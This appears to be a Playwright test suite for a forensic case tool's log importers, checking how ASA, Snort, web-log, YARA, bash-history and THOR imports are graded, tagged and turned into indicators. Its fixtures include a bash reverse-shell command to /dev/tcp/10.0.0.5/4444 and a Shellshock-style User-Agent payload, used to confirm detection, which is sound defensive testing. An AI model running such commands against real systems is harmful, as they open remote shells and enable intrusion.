import { test, expect } from "../fixtures/test.js";
import type { APIRequestContext, Page } from "@playwright/test";

// Covers: US-259, US-263, US-264, US-283, US-284, US-285, US-286, US-287, US-288
// (feature-user-stories.csv) — the deterministic network/shell importers (Cisco ASA, Snort fast
// alerts, combined web logs, YARA output, shell history), the recon/tradecraft command tagging
// that grades what those importers bring in, the IOC diff a new import reports, and the
// user-authored declarative importer.
//
// Same ground rules as importers.spec.ts: real payloads whose shapes come from the unit-test
// fixtures that already prove them valid (ciscoAsaImport.test.ts, snortImport.test.ts,
// combinedLogImport.test.ts, yaraImport.test.ts, bashHistoryImport.test.ts), imports answer 202,
// and content assertions poll the case state because "accepted" and "visible to the investigator"
// are different claims. Every importer here parses before answering — no AI call, no stub
// dependence, so severity and technique assertions are exact.

async function importText(
  request: APIRequestContext,
  caseId: string,
  filename: string,
  text: string,
): Promise<{ kind?: string }> {
  const res = await request.post(`/cases/${caseId}/import`, { data: { filename, text } });
  expect(res.status(), await res.text()).toBe(202);
  return (await res.json()) as { kind?: string };
}

type TimelineEvent = {
  description?: string;
  severity?: string;
  mitreTechniques?: string[];
  path?: string;
};

async function timelineOf(page: Page, caseId: string): Promise<TimelineEvent[]> {
  const res = await page.request.get(`/cases/${caseId}/state`);
  expect(res.status(), await res.text()).toBe(200);
  const state = (await res.json()) as { forensicTimeline?: TimelineEvent[] };
  return state.forensicTimeline ?? [];
}

/** Poll until an event whose description matches lands on the SUPER-timeline (q= server search). */
async function awaitSuperEvent(
  page: Page,
  caseId: string,
  query: string,
  needle: RegExp,
): Promise<{ description?: string; severity?: string; mitreTechniques?: string[] }> {
  const find = async () => {
    const res = await page.request.get(
      `/cases/${caseId}/super-timeline?q=${encodeURIComponent(query)}&offset=0&limit=50`,
    );
    expect(res.status(), await res.text()).toBe(200);
    const body = (await res.json()) as {
      events: Array<{ description?: string; severity?: string; mitreTechniques?: string[] }>;
    };
    return body.events.find((e) => needle.test(e.description ?? ""));
  };
  await expect.poll(async () => !!(await find()), { timeout: 20_000 }).toBe(true);
  return (await find()) as { description?: string; severity?: string; mitreTechniques?: string[] };
}

/** Poll until an event whose description matches lands in the forensic timeline. */
async function awaitEvent(page: Page, caseId: string, needle: RegExp): Promise<TimelineEvent> {
  await expect
    .poll(async () => (await timelineOf(page, caseId)).some((e) => needle.test(e.description ?? "")), {
      timeout: 20_000,
    })
    .toBe(true);
  const match = (await timelineOf(page, caseId)).find((e) => needle.test(e.description ?? ""));
  return match as TimelineEvent;
}

test("US-284: Cisco ASA syslog imports as telemetry and is detected as ASA", async ({ page, demoCase }) => {
  // Shape from tests/analysis/ciscoAsaImport.test.ts. TEST-NET-style ranges are kept as-is from
  // that fixture; nothing here is enriched (no provider is configured in this harness).
  const asa = [
    "<166>May 15 06:42:06 fw01 %ASA-6-302013: Built outbound TCP connection 1209723 for inside:10.30.20.30/45083 (45.62.114.1/21267) to outside:185.143.62.40/443 (185.143.62.40/443)",
    "<166>May 15 06:42:09 fw01 %ASA-6-302014: Teardown TCP connection 1209723 for inside:10.30.20.30/45083 to outside:185.143.62.40/443 duration 0:00:03 bytes 23625 TCP FINs",
  ].join("\n");

  const reply = await importText(page.request, demoCase, "asa.log", asa);
  expect(reply.kind, "the sniffer must route ASA syslog to the ASA importer").toBe("asa");

  // Plain connection telemetry is Info — and Info NEVER reaches the forensic timeline (the
  // forensic/super-timeline boundary). The right assertions are therefore split: the event exists
  // on the super-timeline at Info, and it did NOT leak into the forensic record.
  const event = await awaitSuperEvent(page, demoCase, "185.143.62.40", /185\.143\.62\.40/);
  expect(event.severity, "plain connection teardown is telemetry, not an alert").toBe("Info");
  expect(
    (await timelineOf(page, demoCase)).some((e) => /185\.143\.62\.40/.test(e.description ?? "")),
    "Info telemetry leaked into the forensic timeline",
  ).toBe(false);
});

test("US-285: Snort fast alerts import with severity from the rule's own priority", async ({
  page,
  demoCase,
}) => {
  const fast = [
    "05/14-12:26:09.500 [**] [1:2009714:9] ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT [**] [Classification: web-application-attack] [Priority: 1] {TCP} 145.78.103.167:60278 -> 45.83.220.5:80",
    "05/14-12:08:14.605 [**] [1:366:1] PROTOCOL-ICMP PING BSDtype [**] [Classification: icmp-event] [Priority: 3] {ICMP} 37.75.195.175 -> 45.83.220.5",
  ].join("\n");

  const reply = await importText(page.request, demoCase, "fast.log", fast);
  expect(reply.kind).toBe("snort");

  // Priority 1 must grade above priority 3 — the whole point of consuming the IDS's own ranking
  // is that a SQL-injection alert does not sit at the same level as a ping.
  const sqli = await awaitEvent(page, demoCase, /SQL Injection/);
  const ping = await awaitEvent(page, demoCase, /PING BSDtype/);
  const order = ["Critical", "High", "Medium", "Low", "Info"];
  expect(
    order.indexOf(sqli.severity ?? "Info"),
    `SQLi=${sqli.severity} must outrank ping=${ping.severity}`,
  ).toBeLessThan(order.indexOf(ping.severity ?? "Info"));
});

test("US-286: a combined-format web log imports as telemetry, harvesting referer domain and URL IOCs", async ({
  page,
  demoCase,
}) => {
  // THE STORY'S IOC CLAIM IS WRONG, and that is worth knowing before reading this test. The CSV
  // says "IOC-harvesting client IPs/URLs" — but mapCombinedLogLine() harvests DOMAINS (request
  // host + referer host), URLs carrying a query string, and anomalous User-Agents. The client IP
  // stays in the event description only. Asserting the real harvest, and noting the divergence
  // here rather than filing it as a product defect (the reports.spec.ts precedent).
  const line =
    '203.0.113.77 - - [14/May/2024:19:00:00 +0000] "GET /wp-login.php HTTP/1.1" 200 10 ' +
    '"https://staging.e2e-weblog.example/portal?session=abc123" "() { :; }; /bin/probe"';
  const reply = await importText(page.request, demoCase, "access.log", line);
  expect(reply.kind).toBe("combinedlog");

  // Access-log lines are Info telemetry, so they live on the super-timeline only — same boundary
  // as the ASA test above.
  await awaitSuperEvent(page, demoCase, "wp-login.php", /wp-login\.php/);

  // The real harvest: the referer's host as a domain IOC, its query-URL as a url IOC, and the
  // non-Product/Version User-Agent as an `other` IOC. example-reserved names only — nothing here
  // can resolve, and no enrichment provider is configured in this harness regardless.
  await expect
    .poll(
      async () => {
        const res = await page.request.get(`/cases/${demoCase}/state`);
        const state = (await res.json()) as { iocs?: Array<{ type?: string; value?: string }> };
        const iocs = state.iocs ?? [];
        return {
          domain: iocs.some((i) => i.type === "domain" && i.value === "staging.e2e-weblog.example"),
          url: iocs.some((i) => i.type === "url" && (i.value ?? "").includes("portal?session=abc123")),
          ua: iocs.some((i) => (i.value ?? "").includes("/bin/probe")),
        };
      },
      { timeout: 20_000 },
    )
    .toEqual({ domain: true, url: true, ua: true });
});

test("US-287: YARA CLI output imports the rule verdict without re-running any rule", async ({
  page,
  demoCase,
}) => {
  // Header + -s string lines, the two line shapes looksLikeYara() accepts
  // (tests/analysis/yaraImport.test.ts).
  const yara = ["Trigona_Dropper [T1486] C:\\evidence\\dropper.dll", "0x1a2b:$mz: 4d 5a 90 00"].join("\n");

  const reply = await importText(page.request, demoCase, "yara-scan.txt", yara);
  expect(reply.kind).toBe("yara");

  const event = await awaitEvent(page, demoCase, /YARA: Trigona_Dropper matched/);
  expect(event.severity, "a rule match is a Medium detection by default").toBe("Medium");
  // The technique comes from the rule's own tag — the importer consumes YARA's verdict, it does
  // not invent one.
  expect(event.mitreTechniques ?? []).toContain("T1486");
});

test("US-288 + US-263/US-264: shell history imports timestamped commands, graded only for real tradecraft", async ({
  page,
  demoCase,
}) => {
  // From bashHistoryImport.test.ts: one reverse shell (tradecraft — High), one recon command
  // (technique-tagged), one plain command (must stay ungraded noise).
  const history = [
    "#1770000000",
    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
    "#1770000060",
    "whoami",
    "#1770000120",
    "ls -la /var/www",
  ].join("\n");

  const reply = await importText(page.request, demoCase, ".bash_history", history);
  expect(reply.kind).toBe("bashhistory");

  // US-264: the reverse shell is graded High by the tradecraft table — this is the deterministic
  // content grading the severity-gating rules in ARCHITECTURE.md describe, visible end to end.
  const revshell = await awaitEvent(page, demoCase, /\/dev\/tcp\/10\.0\.0\.5\/4444/);
  expect(revshell.severity).toBe("High");

  // US-263: `whoami` alone is benign — CMD_RULES deliberately matches nothing for it, so it stays
  // Info, and per the forensic/super-timeline boundary an Info event never reaches the forensic
  // timeline. It lives on the analyst-only super-timeline, WITH its discovery technique tag. Both
  // halves are asserted where each actually lives; finding whoami in the forensic timeline would
  // itself be a boundary regression.
  expect(
    (await timelineOf(page, demoCase)).some((e) => /\bwhoami\b/.test(e.description ?? "")),
    "an ungraded recon command leaked into the forensic timeline",
  ).toBe(false);

  const superRes = await page.request.get(`/cases/${demoCase}/super-timeline?q=whoami&offset=0&limit=50`);
  expect(superRes.status(), await superRes.text()).toBe(200);
  const superBody = (await superRes.json()) as {
    events: Array<{ description?: string; severity?: string; mitreTechniques?: string[] }>;
  };
  const whoami = superBody.events.find((e) => /\bwhoami\b/.test(e.description ?? ""));
  expect(whoami, "the whoami line must be kept as evidence on the super-timeline").toBeTruthy();
  expect(whoami?.severity, "benign recon must stay Info, not be manufactured upward").toBe("Info");
  // The tag is the story: individually benign, still counted as T1033 discovery.
  expect(whoami?.mitreTechniques ?? []).toContain("T1033");
});

test("US-259: the import banner's IOC diff names exactly the indicators this import added", async ({
  page,
  demoCase,
}) => {
  const beforeRes = await page.request.get(`/cases/${demoCase}/state`);
  const before = (await beforeRes.json()) as { iocs?: Array<{ value?: string }> };
  const beforeValues = new Set((before.iocs ?? []).map((i) => i.value));
  // A THOR line whose hash is new to the case — the diff must report it as added.
  const freshHash = "9999e753f6f9bfa5c5de0edbb8dd3cc7f1fa51714097d3144d44e5e89dbd0259";
  expect(beforeValues.has(freshHash)).toBe(false);

  await importText(
    page.request,
    demoCase,
    "iocdiff.jsonl",
    JSON.stringify({
      time: "2026-06-03T11:00:00Z",
      hostname: "IOCDIFF-HOST",
      level: "Alert",
      module: "ProcessCheck",
      message: "Malicious process found",
      process_name: "iocdiff.exe",
      image_sha256: freshHash,
      reason_1: "YARA rule Powerkatz_DLL",
    }),
  );

  await expect
    .poll(
      async () => {
        const res = await page.request.get(`/cases/${demoCase}/import-meta`);
        const meta = (await res.json()) as { iocsDiff?: { added?: Array<{ value?: string }> } };
        return (meta.iocsDiff?.added ?? []).map((i) => i.value);
      },
      { timeout: 20_000 },
    )
    .toContain(freshHash);

  // And the already-tracked seeded IOCs must NOT be in the added list — "added" that repeats the
  // whole ledger is exactly the bug the story exists to rule out.
  const res = await page.request.get(`/cases/${demoCase}/import-meta`);
  const meta = (await res.json()) as { iocsDiff?: { added?: Array<{ value?: string }> } };
  for (const item of meta.iocsDiff?.added ?? []) {
    expect(beforeValues.has(item.value), `${item.value} was already tracked before this import`).toBe(false);
  }
});

test("US-283: a declarative importer is authored, routes its format, and a malformed spec fails with field errors", async ({
  page,
  demoCase,
}, testInfo) => {
  // Importers are a GLOBAL registry (no case scoping), so the id carries the test identity and the
  // spec is deleted at the end even on the happy path.
  const importerId = `e2e-widget-audit-${testInfo.workerIndex}-${testInfo.retry}`;
  const spec = {
    id: importerId,
    label: "E2E widget audit log",
    version: 1,
    description: "CSV audit export used by the declarative-importer e2e test",
    match: {
      format: "csv",
      // Headers distinctive enough that no built-in importer competes for the file.
      requireHeaders: ["WidgetTime", "WidgetHost", "WidgetAction"],
      priority: 50,
    },
    map: {
      timestamp: { from: ["WidgetTime"], format: "auto" },
      description: "{{WidgetAction}} on {{WidgetHost}}",
      severity: { from: ["WidgetLevel"], map: { alert: "High" }, default: "Medium" },
      asset: { from: ["WidgetHost"] },
    },
  };

  const created = await page.request.post(`/importers`, { data: { spec } });
  expect(created.status(), await created.text()).toBe(201);

  try {
    const csv = [
      "WidgetTime,WidgetHost,WidgetAction,WidgetLevel",
      "2026-06-02T08:00:00Z,WIDGET-01,suspicious widget launch,alert",
    ].join("\n");
    const reply = await importText(page.request, demoCase, "widgets.csv", csv);
    // The kind proves ROUTING: the sniffer picked the analyst's importer, not the generic CSV/AI
    // path — which is the difference between "no code" and "no effect".
    expect(reply.kind).toBe(importerId);

    const event = await awaitEvent(page, demoCase, /suspicious widget launch on WIDGET-01/);
    expect(event.severity, "the spec's severity map must apply").toBe("High");
  } finally {
    const removed = await page.request.delete(`/importers/${importerId}`);
    expect(removed.status(), await removed.text()).toBe(200);
  }

  // The failure half of the story: a malformed spec must fail loudly, per field, instead of
  // crashing the import path or being silently accepted.
  const malformed = await page.request.post(`/importers`, {
    data: { spec: { ...spec, id: "Bad ID", map: { description: "x" } } },
  });
  expect(malformed.status(), await malformed.text()).toBe(400);
  const body = (await malformed.json()) as { errors?: string[] };
  expect((body.errors ?? []).length, "field-level errors, not one opaque refusal").toBeGreaterThan(0);
});
